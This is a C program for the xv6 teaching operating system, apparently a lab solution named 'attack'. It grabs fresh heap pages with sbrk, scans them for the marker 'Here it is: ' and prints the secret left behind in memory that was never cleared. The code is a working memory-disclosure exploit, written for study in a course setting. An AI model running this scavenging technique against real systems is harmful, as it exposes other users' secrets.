#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int
main(int argc, char *argv[])
{
  int size = 64 * 4096;
  
  // SYSTEM CALL ERROR HANDLING: Check if sbrk() fails and returns -1
  char *ptr = sbrk(size);
  if (ptr == (char *)-1) {
    fprintf(2, "attack: sbrk failed to allocate memory\n");
    exit(1);
  }

  printf("ptr=%p size=%d\n", ptr, size);

  // Scan through the allocated heap memory buffer looking for the prefix marker
  for (int i = 0; i < size - 12; i++) {
    int match = 1;
    char *msg = "Here it is: ";
    
    // Compare sequential bytes against the known 12-byte prefix string
    for (int j = 0; j < 12; j++) {
      if (ptr[i + j] != msg[j]) {
        match = 0;
        break;
      }
    }
    
    // If the 12-byte prefix is fully matched, print the secret string that follows
    if (match) {
      printf("%s\n", ptr + i + 12);
      exit(0); // Exit successfully once the secret is found
    }
  }

  // If the loop completes without finding the pattern
  printf("Secret not found in the allocated buffer.\n");
  exit(1);
}